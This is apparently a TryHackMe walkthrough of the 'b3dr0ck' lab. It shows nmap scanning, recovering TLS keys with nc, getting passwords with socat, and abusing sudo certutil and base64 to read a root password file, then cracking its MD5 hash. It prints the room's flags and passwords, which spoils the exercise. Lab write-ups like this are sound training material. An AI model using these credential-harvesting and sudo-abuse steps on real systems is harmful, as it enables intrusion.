# b3dr0ck — TryHackMe Walkthrough

**Target IP:** 10.48.129.19  
**Attack Machine:** Kali Linux  
**Difficulty:** Easy  
**Category:** TLS / Certificate  
**Flags:** 4

---

## Flags Captured

| # | Flag | Method |
|---|------|--------|
| 1 | THM{f05780f08f0eb1de65023069d0e4c90c} | SSH as barney |
| 2 | YabbaDabbaD0000! | TLS service → certutil |
| 3 | THM{08da34e619da839b154521da7323559d} | su to fred |
| 4 | THM{de4043c009214b56279982bf10a661b7} | Crack MD5 hash → su root |

---

## Phase 1 — Reconnaissance

### Nmap Scan
```
nmap -sC -sV 10.48.129.19 -oN nmap_scan.txt
```

**Open Ports:**
- 22/tcp — SSH (OpenSSH 8.2p1)
- 80/tcp — HTTP (nginx 1.18.0, redirects to 4040)
- 9009/tcp — Custom service (pichat?)
- 4040/tcp — HTTPS web server
- 54321/tcp — SSL secure login service

---

## Phase 2 — Foothold: Barney

### Recover Certificates from Port 9009
```
nc 10.48.129.19 9009
# Ask for: key
# Ask for: certificate
```
Save the returned TLS key and cert to `client.key` and `client.crt`.

### Get Barney's Password via Port 54321
```
socat stdio ssl:10.48.129.19:54321,cert=client.crt,key=client.key,verify=0
# Type: password
```
Password: **YabbaDabbaD0000!**

### SSH as Barney
```
ssh barney@10.48.129.19
Password: YabbaDabbaD0000!

cat barney.txt
THM{f05780f08f0eb1de65023069d0e4c90c}
```

---

## Phase 3 — Lateral Movement: Barney → Fred

### Check Sudo
```
sudo -l
(ALL : ALL) /usr/bin/certutil
```

### Generate Fred's Certificate
```
sudo /usr/bin/certutil fred "Fred Flintstone"
```
Save the new cert/key, connect as Fred, get password.

### Switch to Fred
```
su fred
Password: YabbaDabbaD0000!

cat fred.txt
THM{08da34e619da839b154521da7323559d}
```

---

## Phase 4 — Privilege Escalation: Fred → Root

### Check Sudo
```
sudo -l
(ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

### Decode Root Password
```
sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
# Output: a00a12aad6b7c16bf07032bd05a31d56
```

### Crack the MD5 Hash
Submit to crackstation.net → **flintstonesvitamins**

### Switch to Root
```
su root
Password: flintstonesvitamins

cat /root/root.txt
THM{de4043c009214b56279982bf10a661b7}
```

---

## Vulnerability Chain
1. **Exposed Credential Recovery** — Port 9009 serves TLS keys/certs with no authentication
2. **Certificate-Based Auth Bypass** — Port 54321 accepts any cert signed by the internal CA
3. **Abusable Sudo (certutil)** — Can generate certs for any user as root
4. **Sudo Password Read** — Can base32/base64 /root/pass.txt as fred without password
5. **Weak Root Password** — Crackable via MD5 lookup
